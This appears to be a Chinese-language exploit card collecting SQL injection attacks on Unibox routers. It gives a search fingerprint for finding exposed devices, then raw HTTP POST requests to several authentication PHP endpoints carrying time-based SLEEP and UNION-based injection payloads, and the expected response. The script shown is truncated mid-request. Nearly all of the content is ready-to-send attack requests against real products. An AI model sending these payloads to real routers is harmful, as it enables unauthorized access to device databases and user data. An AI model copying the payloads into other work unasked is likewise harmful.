# Unibox路由器SQL注入漏洞合集

- **系统**：Unibox　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="Unibox"`
- **请求**：`POST /authentication/update_byod.php HTTP/1.1`
- **关键头**：`Cookie: rolearray=1';accessarray=1;selectedmodules=1`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
update=1&macAddress=1' AND (SELECT 7876 FROM (SELECT(SLEEP(5)))ogZo) AND 'NXsn'='NXsn&oldMacAddress=
POST /authentication/test_userlogin.php HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
username=-3423' UNION ALL SELECT CONCAT(0x71627a7171,0x6c6561796e6f766466637954775a7646627a494c4c466f5876624c7254674a734e654163566a5768,0x7170717871)-- -
POST /authentication/preworldpay.php HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
req_customercode=1' AND (SELECT 9761 FROM (SELECT(SLEEP(5)))UqnL) AND 'AaNT'='AaNT
POST /authentication/postworldpay.php HTTP/1.1
Host:
Conten…（脚本共 918 字，完整版见原文）
```
- **预期**：200　|　—